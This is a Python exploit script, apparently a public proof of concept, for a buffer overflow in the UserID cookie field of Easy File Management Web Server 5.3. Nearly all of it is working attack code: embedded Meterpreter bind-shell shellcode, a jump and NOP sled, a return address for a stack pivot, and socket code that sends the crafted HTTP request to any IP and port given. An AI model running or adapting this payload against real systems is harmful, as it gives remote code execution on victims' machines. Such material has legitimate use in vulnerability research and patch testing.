#!/usr/bin/python

#########################################################################
# Application: Easy File Management Web Server 5.3                      #
# Vendor Website: http://www.web-file-management.com                    #
# Author: TEKMAN and VOSEC                                              #
# Website: https://infosectekniques.com and https://veilofsecurity.com  #
# Tested OS: Windows Vista & 7 SP1 32bit | should work on others        #
# Description: Buffer overflow in UserID field of vfolder.ghp           #
#########################################################################

import os
import socket
import sys

#check for arguments
if (len(sys.argv) < 3) or (len(sys.argv) > 3):
    print "Requires 2 arguments. Syntax: python efmws.py <ip> <port>"
    sys.exit(1)

#assign arguments to variables
ip = sys.argv[1]
port = int(sys.argv[2])

#bad characters: \x00\x3b | shellcode: 336bytes
#msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -b "\x00\x3b" -f python
shellcode =  ""
shellcode += "\xba\xa9\xde\x84\x96\xdb\xd9\xd9\x74\x24\xf4\x5e\x29"
shellcode += "\xc9\xb1\x4e\x31\x56\x13\x83\xc6\x04\x03\x56\xa6\x3c"
shellcode += "\x71\x6a\x50\x42\x7a\x93\xa0\x23\xf2\x76\x91\x63\x60"
shellcode += "\xf2\x81\x53\xe2\x56\x2d\x1f\xa6\x42\xa6\x6d\x6f\x64"
shellcode += "\x0f\xdb\x49\x4b\x90\x70\xa9\xca\x12\x8b\xfe\x2c\x2b"
shellcode += "\x44\xf3\x2d\x6c\xb9\xfe\x7c\x25\xb5\xad\x90\x42\x83"
shellcode += "\x6d\x1a\x18\x05\xf6\xff\xe8\x24\xd7\x51\x63\x7f\xf7"
shellcode += "\x50\xa0\x0b\xbe\x4a\xa5\x36\x08\xe0\x1d\xcc\x8b\x20"
shellcode += "\x6c\x2d\x27\x0d\x41\xdc\x39\x49\x65\x3f\x4c\xa3\x96"
shellcode += "\xc2\x57\x70\xe5\x18\xdd\x63\x4d\xea\x45\x48\x6c\x3f"
shellcode += "\x13\x1b\x62\xf4\x57\x43\x66\x0b\xbb\xff\x92\x80\x3a"
shellcode += "\xd0\x13\xd2\x18\xf4\x78\x80\x01\xad\x24\x67\x3d\xad"
shellcode += "\x87\xd8\x9b\xa5\x25\x0c\x96\xe7\x21\xe1\x9b\x17\xb1"
shellcode += "\x6d\xab\x64\x83\x32\x07\xe3\xaf\xbb\x81\xf4\xd0\x91"
shellcode += "\x76\x6a\x2f\x1a\x87\xa2\xeb\x4e\xd7\xdc\xda\xee\xbc"
shellcode += "\x1c\xe3\x3a\x28\x16\x42\x95\x4f\xd5\x1e\x14\xfa\x24"
shellcode += "\xb6\xfc\xf5\xf7\xa6\xfe\xdf\x9f\x4e\x03\xe0\x8e\xd2"
shellcode += "\x8a\x06\xda\xfa\xda\x91\x73\x38\x39\x2a\xe3\x43\x6b"
shellcode += "\xd0\x2b\xce\xcc\x8c\xc3\x87\x04\x0a\xeb\x18\x03\x3c"
shellcode += "\x7b\x92\x40\xf8\x9a\xa5\x4c\xa8\xcb\x31\x1a\x39\xb9"
shellcode += "\xa0\x1b\x10\x2b\x22\x8e\x9f\xfa\x75\x26\xa2\xdb\xb1"
shellcode += "\xe9\x5d\x0e\xc2\xee\xa2\xcf\xe9\x85\x95\x45\xb1\xf1"
shellcode += "\xd9\x89\x31\x02\x8c\xc3\x31\x6a\x68\xb0\x62\x8f\x77"
shellcode += "\x6d\x17\x1c\xe2\x8e\x41\xf0\xa5\xe6\x6f\x2f\x81\xa8"
shellcode += "\x90\x1a\x91\xaf\x6e\xdb\x91\x4e\xad\x0a\x58\x25\xd8"
shellcode += "\x8e\xdf\x36\xaf\xb3\x76\xdd\xcf\xe0\x89\xf4"

junk = "A"*64
jmp = "\xeb\x12" #jmp forward 18bytes to shellcode
nops = "\x90"*14 #keep offset aligned

#0x100266ef = 0x10026717-28 ImageLoad.dll and fmws.exe
ret_ptr = "\xef\x66\x02\x10" #ptr->0x004e414e->stackpivot +32 (pop esi; add esp,1c; retn;)

#assemble payload
evil = junk + jmp + nops + ret_ptr + shellcode

#assemble buffer with payload in UserID field
buffer = "GET /vfolder.ghp HTTP/1.1\r\n"
buffer += "Host: " + ip + "\r\n"
buffer += "Cookie: SESSIONID=4432; UserID=" + evil + "; PassWD=; frmUserName=; frmUserPass=; rememberPass=202%2C197%2C208%2C215%2C201\r\n"
buffer += "Connection: keep-alive"
buffer += "\r\n\r\n"

print "[*]Sending evil buffer ... [*]"
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect((ip, port))
s.send(buffer)
s.close()
